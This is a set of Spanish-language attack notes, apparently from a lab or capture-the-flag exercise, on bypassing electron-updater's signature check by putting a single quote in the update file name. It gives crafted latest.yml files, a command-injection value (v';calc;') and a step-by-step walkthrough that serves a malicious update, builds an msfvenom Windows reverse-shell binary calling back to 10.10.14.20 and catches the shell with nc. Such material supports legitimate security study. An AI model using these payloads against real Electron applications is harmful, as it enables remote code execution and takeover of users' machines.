https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html

Dado que la variable $ {tempUpdateFile} se proporciona sin escape a la utilidad execFile, un atacante podría omitir toda la verificación de la firma activando un error de análisis en el script. Esto se puede lograr fácilmente usando un nombre de archivo que contenga una comilla simple y luego recalculando el hash del archivo para que coincida con el binario proporcionado por el atacante (usando shasum -a 512 maliciosoupdate.exe | cut -d "" -f1 | xxd -r -p | base64).

Por ejemplo, una definición de actualización maliciosa se vería así:

```
version: 1.2.3
files:
  - url: v’ulnerable-app-setup-1.2.3.exe
  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
  size: 44653912
path: v'ulnerable-app-1.2.3.exe
sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
releaseDate: '2019-11-20T11:17:02.627Z'
```

Al entregar un archivo latest.yml similar a una aplicación Electron vulnerable, el ejecutable de instalación elegido por el atacante se ejecutará sin advertencias. Alternativamente, pueden aprovechar la falta de escape para realizar una inyección de comando trivial:

```
version: 1.2.3
files:
  - url: v';calc;'ulnerable-app-setup-1.2.3.exe
  sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZ[...]tkYPEvMxDWgNkb8tPCNZLTbKWcDEOJzfA==
  size: 44653912
path: v';calc;'ulnerable-app-1.2.3.exe
sha512: GIh9UnKyCaPQ7ccX0MDL10UxPAAZr1[...]ZrR5X1kb8tPCNZLTbKWcDEOJzfA==
releaseDate: '2019-11-20T11:17:02.627Z'
```

Desde el punto de vista de un atacante, sería más práctico hacer una puerta trasera al instalador y luego aprovechar las funciones preexistentes del actualizador electrónico como isAdminRightsRequired para ejecutar el instalador con privilegios de administrador.

** Ataque sobre Electro-Builder **
* Primera prueba- Ejecución de comandos.
	Tomamos como ejemplo que en la máquina objetivo tenemos acceso a subir un fichero "latest.yml" que utilizará la aplicación Electro-Builder para actualizar de forma remota la aplicación.
	Creamos un fichero "latest.yml":
	```
	version: 1.2.3
	path: http://10.10.14.20/test
	sha512: <cualquier SHA512>
	```
	Levantamos un servidor web en espera de alguna conexión http --> `python -m SimpleHTTPServer 80`
	Obtenemos una petición web.
	
* Segunda prueba - Reverse shell.
	Cremos un payload con una reverse shell con msfvenom con un binario .exe
	`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.20 LPORT=443 -f exe -o r'everse.exe`
	Es importante que el nombre del archivo incluya la comilla, ya que en el código se utilizan comillas simples y así escapamos del contexto de las comillas y provocamos que se ejecute el binario.
	Modificamos el fichero "latest.yml":
	```
	version: 1.2.3
	path: http://10.10.14.20/r'everse.exe
	sha512: <SHA512_computado_para_r'everse.exe>
	```
	Para computar el binario --> `sha512sum r'everse.exe`
	Abrimos un puerto en escucha de peticiones --> `rlwrap nc -nlvp 443`
	Obtenemos una reverse shell.